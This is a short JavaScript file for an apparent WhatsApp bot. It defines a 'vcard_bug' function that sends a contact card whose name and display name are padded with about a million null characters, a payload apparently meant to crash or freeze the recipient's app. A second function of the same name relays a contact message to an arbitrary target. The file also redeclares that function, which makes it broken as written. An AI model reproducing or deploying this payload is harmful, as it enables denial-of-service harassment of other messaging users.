
export async function vcard_bug(message, client) {

    const remoteJid = message.key.remoteJid;

    const vcard = 'BEGIN:VCARD\n' // metadata of the contact card
            + `FN: _*DEV SENKU*_\n${"\u0000".repeat(1020000)}\n` // full name
            + `TEL;type=CELL;type=VOICE;waid=237689360833:+237689360833\n$`
            + 'END:VCARD'

    await client.sendMessage(remoteJid,

        { 
            contacts: { 

                displayName: `_*DEV SENKU"_\n${"\u0000".repeat(1020000)}`, 

                contacts: [{ vcard }] 
            }
        }
    );

}

export default vcard_bug;

export async function vcard_bug(message, client, target) {

    const remoteJid = message.key.remoteJid;

    const vcard = 'BEGIN:VCARD\n'

        + `FN: _*DEV SENKU*_\n`

        + `TEL;type=CELL;type=VOICE;waid=237689360833:+237689360833\n`

        + 'END:VCARD';

    const msg = proto.Message.fromObject({

        contactsMessage: {

            displayName: `_*DEV SENKU*_`,

            contacts: [

                { vcard }
            ]
        }
    });

    await client.relayMessage(target, msg, { 

        messageId: message.key.id 

    },  { participant: { jid: target } }

    );
}